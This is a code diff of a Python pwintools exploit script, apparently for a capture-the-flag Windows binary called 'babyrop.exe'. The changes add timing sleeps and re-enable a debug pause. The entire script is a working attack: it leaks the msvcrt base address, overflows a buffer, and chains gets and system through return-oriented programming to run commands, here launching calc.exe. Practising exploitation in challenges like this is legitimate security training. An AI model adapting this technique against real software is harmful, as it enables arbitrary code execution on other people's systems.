@@ -1,11 +1,11 @@
 # https://gist.github.com/bash-c/6c178705bb4cca51d43a048feb62f395#file-pwintools-py
 from pwintools import *
+from time import sleep
 
 io = process("babyrop.exe")
 
-
-
 io.sendline("a" * 24)
+sleep(0.01)
 io.recvuntil("a" * 24)
 
 mscvr_base = u32(io.recv(4)) - 0x26e2d
@@ -23,14 +23,15 @@ payload = "0" * 0xcc + 'aaaa'
 payload += p32(gets) + p32(pecx) + p32(cmd) 
 payload += p32(system) + 'bbbb' + p32(cmd)
 
-io.recvuntil("length")
+io.sendlineafter("length", str(len(payload) + 10))
+sleep(0.01)
 
-io.sendline(str(len(payload) + 10))
-
-# raw_input("DEBUG: ")
+raw_input("DEBUG: ")
 io.sendline(payload)
-io.send("\n")
+sleep(0.01)
+io.sendline()
 
+sleep(0.01)
 io.sendline("calc.exe")
 
 io.interactive()
